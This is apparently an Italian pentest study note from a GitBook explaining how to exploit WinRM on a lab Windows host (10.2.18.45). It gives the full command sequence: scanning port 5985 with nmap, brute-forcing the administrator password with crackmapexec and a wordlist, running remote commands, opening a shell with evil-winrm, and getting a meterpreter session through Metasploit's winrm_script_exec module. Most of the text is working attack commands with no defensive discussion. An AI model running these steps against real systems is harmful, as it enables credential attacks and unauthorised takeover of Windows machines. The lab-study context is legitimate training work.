# Exploiting WinRM

Deve essere abilitato WinRM, non è abilitato di default.

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

```
nmap -sV -p 5985 10.2.18.45
```

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

Però le porte di WinRM sono escluse dalle 1000 porte più comuni per cui nmap fa lo scan di default.

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

## Bruteforce credenziali WinRM con crackmapexec

```
crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Possiamo usarlo anche per mssql, smb e ssh.

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

Ha trovato la password che è tinkerbell. Abbiamo quindi le credenziali di administrator.

## Eseguire comandi arbitrari sul target con crackmapexec

```
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -z "whoami"
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -z "systeminfo"
```

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

## Ottenere una sessione shell sul target con evil-winrm

```
evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45
```

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

## Ottenere una meterpreter session con un modulo MSF

```
service postgresql start && msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set RHOSTS 10.2.18.45
set FORCE_VBS true
set USERNAME administrator
set PASSWORD tinkerbell
exploit
```

<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Viene impostato il payload per 32bit di default.

<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

La porta configurata è 5895 che va bene in questo caso, quindi cambiamo solo RHOSTS.

<figure><img src="../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

Portrebbe essere che non funzioni subito e dobbiamo rieseguirlo.

<figure><img src="../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>
